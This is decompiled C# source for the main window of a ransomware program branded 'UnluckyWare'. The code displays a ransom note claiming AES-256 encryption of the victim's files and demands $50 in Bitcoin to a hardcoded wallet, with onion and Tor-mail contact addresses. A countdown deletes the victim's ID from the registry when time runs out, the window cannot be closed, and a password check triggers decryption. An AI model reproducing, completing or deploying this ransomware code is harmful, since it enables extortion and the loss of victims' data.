using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using Bytelocker.CryptoManager;
using Bytelocker.Settings;
using Bytelocker.Tools;
using Microsoft.Win32;

namespace Bytelocker.UI;

public class MainWindow : Form
{
	private const int MAX_FILE_SIZE_LENGHT_UI = 80;

	public static string current_decrypt_file = "null";

	private string current_decrypt_file_local = "null";

	private readonly LinkLabel llAESInfo;

	private readonly LinkLabel llListOfInfectedFiles;

	private PasswordManager pm;

	private int progress_bar_inc;

	private readonly RegistryManager rm;

	private readonly TimeManager tm;

	private IContainer components = null;

	private Button btnNext;

	private RichTextBox rtfInfo;

	private Label lbTitle;

	private PictureBox pbShield;

	private Label lbTitleTime;

	private Label lbTimeLeft;

	private Timer tmTimeLeftRefresher;

	private TextBox tbPassInput;

	private Button BtnVerify;

	private ProgressBar pbDecryptProgress;

	private Label lbCurrentFileDecrypt;

	private Timer tmTimerDecrypt;

	private TextBox textBox1;

	private Label label1;

	private Label label2;

	private TextBox textBox2;

	private LinkLabel linkLabel1;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ClassStyle(createParams.get_ClassStyle() | 0x200);
			return createParams;
		}
	}

	public MainWindow()
	{
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Expected O, but got Unknown
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		InitializeComponent();
		((Form)this).set_MaximizeBox(false);
		tm = new TimeManager();
		rm = new RegistryManager();
		tm.ReadFromRegistry();
		llAESInfo = new LinkLabel();
		llListOfInfectedFiles = new LinkLabel();
		llListOfInfectedFiles.add_LinkClicked(new LinkLabelLinkClickedEventHandler(On_llListOfInfectedFiles_Click));
		llAESInfo.add_LinkClicked(new LinkLabelLinkClickedEventHandler(On_llAESInfo_Click));
		GetID();
	}

	private void GetID()
	{
		using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\HWID");
		if (registryKey != null)
		{
			object value = registryKey.GetValue("id");
			((Control)textBox2).set_Text(value.ToString());
		}
	}

	private void MainWindow_Load(object sender, EventArgs e)
	{
		MainWindowScreenOne();
	}

	private void MainWindowScreenOne()
	{
		((Control)lbCurrentFileDecrypt).Hide();
		((Control)pbDecryptProgress).Hide();
		((Control)BtnVerify).Hide();
		((Control)tbPassInput).Hide();
		((TextBoxBase)rtfInfo).Clear();
		UpdateTime();
		((Control)llAESInfo).Show();
		((Control)llListOfInfectedFiles).Show();
		((Control)lbTitle).Show();
		((TextBoxBase)rtfInfo).AppendText("Your important files, documents, pictures, etc. Have been encrypted.\n\n");
		((Control)llListOfInfectedFiles).set_Text("Here");
		((Control)llListOfInfectedFiles).set_AutoSize(true);
		((Control)llListOfInfectedFiles).set_Location(((TextBoxBase)rtfInfo).GetPositionFromCharIndex(((TextBoxBase)rtfInfo).get_TextLength()));
		((Control)rtfInfo).get_Controls().Add((Control)(object)llListOfInfectedFiles);
		((TextBoxBase)rtfInfo).AppendText(((Control)llListOfInfectedFiles).get_Text());
		((TextBoxBase)rtfInfo).AppendText(new string(' ', 3));
		((TextBoxBase)rtfInfo).set_SelectionStart(((TextBoxBase)rtfInfo).get_TextLength());
		((TextBoxBase)rtfInfo).AppendText("is a complete list of encrypted files, you can verify this manually.\n\nEncryption was produced using");
		((Control)llAESInfo).set_Text("AES-256");
		((Control)llAESInfo).set_AutoSize(true);
		((Control)llAESInfo).set_Location(((TextBoxBase)rtfInfo).GetPositionFromCharIndex(((TextBoxBase)rtfInfo).get_TextLength()));
		((Control)rtfInfo).get_Controls().Add((Control)(object)llAESInfo);
		((TextBoxBase)rtfInfo).AppendText(((Control)llAESInfo).get_Text());
		((TextBoxBase)rtfInfo).AppendText(new string(' ', 3));
		((TextBoxBase)rtfInfo).set_SelectionStart(((TextBoxBase)rtfInfo).get_TextLength());
		((TextBoxBase)rtfInfo).AppendText("in order to unlock your files you need to pay $50 dollars for the AES Key.\n\nThe key will only be available for a limited time, after this the key will no longer be able to be purchased.\n\nYou can contact us on email : UnluckyWare@torbox3uiot6wchz.onion if we didn't respond contact us on this email : UnluckyWare@mail2tor.com\n\nPlease Provide us your ID when you want to send email.\n\n");
	}

	private void BtnNext_Click(object sender, EventArgs e)
	{
		((TextBoxBase)rtfInfo).Clear();
		((Control)llAESInfo).Hide();
		((Control)llListOfInfectedFiles).Hide();
		((Control)lbTitle).Hide();
		((Control)tbPassInput).Show();
		((Control)btnNext).Hide();
		((Control)BtnVerify).Show();
		((TextBoxBase)rtfInfo).AppendText("Enter password to unlock, then click 'Verify' to begin decryption.");
		((TextBoxBase)rtfInfo).Select(((TextBoxBase)rtfInfo).GetFirstCharIndexFromLine(0), ((TextBoxBase)rtfInfo).get_Lines()[0].Length);
		rtfInfo.set_SelectionBullet(true);
		((TextBoxBase)rtfInfo).DeselectAll();
	}

	private void BtnVerify_Click(object sender, EventArgs e)
	{
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		pm = new PasswordManager();
		pm.FetchPassword();
		if (!(((Control)tbPassInput).get_Text() == pm.returnPassword()))
		{
			MessageBox.Show("Invalid Password", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else
		{
			tmTimeLeftRefresher.Stop();
			((Control)BtnVerify).Hide();
			((Control)lbTimeLeft).set_Text("");
			((TextBoxBase)rtfInfo).Clear();
			((Control)tbPassInput).Hide();
			((Control)lbTitleTime).Hide();
			((Control)lbTitle).set_Text("Decrypting . . .");
			((Control)lbTitle).Show();
			((Control)lbCurrentFileDecrypt).Show();
			((Control)pbDecryptProgress).Show();
			progress_bar_inc = pbDecryptProgress.get_Maximum() / rm.ReadAllValues(RegistryManager.FILES_KEY_NAME).Count;
			tmTimerDecrypt.Start();
			new Thread((ThreadStart)delegate
			{
				Thread.CurrentThread.IsBackground = true;
				Bytelocker.Decrypt();
			}).Start();
		}
		pm = null;
	}

	private void MainWindow_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void On_llAESInfo_Click(object sender, EventArgs e)
	{
		Process.Start("https://en.wikipedia.org/wiki/Advanced_Encryption_Standard");
	}

	private void On_llBitcoinInfo_Click(object sender, EventArgs e)
	{
		Process.Start("https://bitcoin.org/en/getting-started");
		Process.Start("https://www.investopedia.com/tech/how-to-buy-bitcoin/");
	}

	private void On_llListOfInfectedFiles_Click(object sender, EventArgs e)
	{
		LaunchListOfEncryptedFilesWindow();
	}

	private void UpdateTimeLeftEvent(object sender, EventArgs e)
	{
		UpdateTime();
	}

	private void tmTimerDecrypt_Tick(object sender, EventArgs e)
	{
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		if (!(rm.ReadAllValues(RegistryManager.FILES_KEY_NAME)[0] == "null"))
		{
			if (!(current_decrypt_file_local == current_decrypt_file))
			{
				current_decrypt_file_local = current_decrypt_file;
				if (current_decrypt_file.Length > 80)
				{
					((Control)lbCurrentFileDecrypt).set_Text(TruncateFilePath.ShrinkPath(current_decrypt_file, 80));
				}
				else
				{
					((Control)lbCurrentFileDecrypt).set_Text(current_decrypt_file);
				}
				pbDecryptProgress.Increment(progress_bar_inc);
			}
		}
		else
		{
			tmTimerDecrypt.Stop();
			pbDecryptProgress.set_Value(pbDecryptProgress.get_Maximum());
			MessageBox.Show("Finished Decrypting. Software will now uninstall.", "Finished", (MessageBoxButtons)0, (MessageBoxIcon)64);
			((Control)this).set_Visible(false);
			Bytelocker.Uninstall();
		}
	}

	private void UpdateTime()
	{
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		int num = (int)tm.DetermineRemainingTimeInSeconds();
		if (num < 0)
		{
			tmTimeLeftRefresher.Stop();
			((Control)lbTimeLeft).set_Text("00:00:00:00");
			MessageBox.Show("Time is done!!!");
			Registry.CurrentUser.DeleteSubKeyTree("Software\\Microsoft\\HWID");
		}
		else
		{
			((Control)lbTimeLeft).set_Text(TimeSpan.FromSeconds(num).ToString("dd\\:hh\\:mm\\:ss"));
		}
	}

	private void LaunchListOfEncryptedFilesWindow()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		EncryptedFilesList encryptedFilesList = new EncryptedFilesList();
		((Form)encryptedFilesList).ShowDialog();
	}

	private void rtfInfo_TextChanged(object sender, EventArgs e)
	{
	}

	private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://bitcoin.org/en/getting-started");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_021b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0225: Expected O, but got Unknown
		//IL_028d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0297: Expected O, but got Unknown
		//IL_0318: Unknown result type (might be due to invalid IL or missing references)
		//IL_0322: Expected O, but got Unknown
		//IL_0398: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a2: Expected O, but got Unknown
		//IL_05cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d9: Expected O, but got Unknown
		//IL_0662: Unknown result type (might be due to invalid IL or missing references)
		//IL_066c: Expected O, but got Unknown
		//IL_06e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_06f3: Expected O, but got Unknown
		//IL_075e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0768: Expected O, but got Unknown
		//IL_07de: Unknown result type (might be due to invalid IL or missing references)
		//IL_07e8: Expected O, but got Unknown
		//IL_086c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0876: Expected O, but got Unknown
		//IL_09b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_09c3: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainWindow));
		btnNext = new Button();
		rtfInfo = new RichTextBox();
		lbTitle = new Label();
		pbShield = new PictureBox();
		lbTitleTime = new Label();
		lbTimeLeft = new Label();
		tmTimeLeftRefresher = new Timer(components);
		tbPassInput = new TextBox();
		BtnVerify = new Button();
		pbDecryptProgress = new ProgressBar();
		lbCurrentFileDecrypt = new Label();
		tmTimerDecrypt = new Timer(components);
		textBox1 = new TextBox();
		label1 = new Label();
		label2 = new Label();
		textBox2 = new TextBox();
		linkLabel1 = new LinkLabel();
		((ISupportInitialize)pbShield).BeginInit();
		((Control)this).SuspendLayout();
		((Control)btnNext).set_Location(new Point(631, 447));
		((Control)btnNext).set_Name("btnNext");
		((Control)btnNext).set_Size(new Size(120, 35));
		((Control)btnNext).set_TabIndex(0);
		((Control)btnNext).set_Text("Next >>");
		((ButtonBase)btnNext).set_UseVisualStyleBackColor(true);
		((Control)btnNext).add_Click((EventHandler)BtnNext_Click);
		((Control)rtfInfo).set_Location(new Point(234, 70));
		((Control)rtfInfo).set_Name("rtfInfo");
		((TextBoxBase)rtfInfo).set_ReadOnly(true);
		rtfInfo.set_ScrollBars((RichTextBoxScrollBars)2);
		((Control)rtfInfo).set_Size(new Size(517, 324));
		((Control)rtfInfo).set_TabIndex(1);
		((Control)rtfInfo).set_Text("");
		((Control)rtfInfo).add_TextChanged((EventHandler)rtfInfo_TextChanged);
		((Control)lbTitle).set_AutoSize(true);
		((Control)lbTitle).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lbTitle).set_Location(new Point(119, 14));
		((Control)lbTitle).set_Name("lbTitle");
		((Control)lbTitle).set_Size(new Size(587, 29));
		((Control)lbTitle).set_TabIndex(2);
		((Control)lbTitle).set_Text("WARNING! ALL YOUR FILES ARE ENCRYPTED! ");
		pbShield.set_Image((Image)componentResourceManager.GetObject("pbShield.Image"));
		((Control)pbShield).set_Location(new Point(27, 54));
		((Control)pbShield).set_Name("pbShield");
		((Control)pbShield).set_Size(new Size(186, 180));
		pbShield.set_SizeMode((PictureBoxSizeMode)1);
		pbShield.set_TabIndex(3);
		pbShield.set_TabStop(false);
		((Control)lbTitleTime).set_AutoSize(true);
		((Control)lbTitleTime).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)lbTitleTime).set_Location(new Point(77, 263));
		((Control)lbTitleTime).set_Name("lbTitleTime");
		((Control)lbTitleTime).set_Size(new Size(73, 20));
		((Control)lbTitleTime).set_TabIndex(4);
		((Control)lbTitleTime).set_Text("Time left:");
		((Control)lbTimeLeft).set_AutoSize(true);
		((Control)lbTimeLeft).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lbTimeLeft).set_Location(new Point(62, 293));
		((Control)lbTimeLeft).set_Name("lbTimeLeft");
		((Control)lbTimeLeft).set_Size(new Size(104, 20));
		((Control)lbTimeLeft).set_TabIndex(6);
		((Control)lbTimeLeft).set_Text("00:00:00:00");
		tmTimeLeftRefresher.set_Enabled(true);
		tmTimeLeftRefresher.set_Interval(1000);
		tmTimeLeftRefresher.add_Tick((EventHandler)UpdateTimeLeftEvent);
		((Control)tbPassInput).set_Location(new Point(259, 102));
		((Control)tbPassInput).set_Name("tbPassInput");
		((Control)tbPassInput).set_Size(new Size(341, 20));
		((Control)tbPassInput).set_TabIndex(7);
		((Control)BtnVerify).set_Location(new Point(631, 448));
		((Control)BtnVerify).set_Name("BtnVerify");
		((Control)BtnVerify).set_Size(new Size(120, 35));
		((Control)BtnVerify).set_TabIndex(9);
		((Control)BtnVerify).set_Text("Verify");
		((ButtonBase)BtnVerify).set_UseVisualStyleBackColor(true);
		((Control)BtnVerify).add_Click((EventHandler)BtnVerify_Click);
		((Control)pbDecryptProgress).set_Location(new Point(259, 229));
		((Control)pbDecryptProgress).set_Name("pbDecryptProgress");
		((Control)pbDecryptProgress).set_Size(new Size(467, 21));
		((Control)pbDecryptProgress).set_TabIndex(10);
		((Control)lbCurrentFileDecrypt).set_AutoSize(true);
		((Control)lbCurrentFileDecrypt).set_Location(new Point(256, 204));
		((Control)lbCurrentFileDecrypt).set_Name("lbCurrentFileDecrypt");
		((Control)lbCurrentFileDecrypt).set_Size(new Size(0, 13));
		((Control)lbCurrentFileDecrypt).set_TabIndex(11);
		tmTimerDecrypt.set_Interval(80);
		tmTimerDecrypt.add_Tick((EventHandler)tmTimerDecrypt_Tick);
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_Location(new Point(429, 412));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(305, 22));
		((Control)textBox1).set_TabIndex(12);
		((Control)textBox1).set_Text("bc1qeurvczsptses3xmregxwzw3gdk4uuzj5upzzek");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_Location(new Point(237, 410));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(177, 24));
		((Control)label1).set_TabIndex(13);
		((Control)label1).set_Text("Our Bitcoin Adress :");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(12, 459));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(65, 18));
		((Control)label2).set_TabIndex(15);
		((Control)label2).set_Text("Your ID :");
		((Control)textBox2).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox2).set_Location(new Point(81, 457));
		((TextBoxBase)textBox2).set_Multiline(true);
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(333, 22));
		((Control)textBox2).set_TabIndex(14);
		((Control)linkLabel1).set_AutoSize(true);
		((Control)linkLabel1).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		linkLabel1.set_LinkColor(Color.Blue);
		((Control)linkLabel1).set_Location(new Point(24, 350));
		((Control)linkLabel1).set_Name("linkLabel1");
		((Control)linkLabel1).set_Size(new Size(164, 18));
		((Control)linkLabel1).set_TabIndex(16);
		linkLabel1.set_TabStop(true);
		((Control)linkLabel1).set_Text("Where To Buy Bitcoin ?");
		linkLabel1.add_LinkClicked(new LinkLabelLinkClickedEventHandler(linkLabel1_LinkClicked));
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(759, 494));
		((Control)this).get_Controls().Add((Control)(object)linkLabel1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)lbCurrentFileDecrypt);
		((Control)this).get_Controls().Add((Control)(object)pbDecryptProgress);
		((Control)this).get_Controls().Add((Control)(object)BtnVerify);
		((Control)this).get_Controls().Add((Control)(object)tbPassInput);
		((Control)this).get_Controls().Add((Control)(object)lbTimeLeft);
		((Control)this).get_Controls().Add((Control)(object)lbTitleTime);
		((Control)this).get_Controls().Add((Control)(object)pbShield);
		((Control)this).get_Controls().Add((Control)(object)lbTitle);
		((Control)this).get_Controls().Add((Control)(object)rtfInfo);
		((Control)this).get_Controls().Add((Control)(object)btnNext);
		((Form)this).set_FormBorderStyle((FormBorderStyle)2);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("MainWindow");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("UnluckyWare ");
		((Form)this).add_Load((EventHandler)MainWindow_Load);
		((ISupportInitialize)pbShield).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
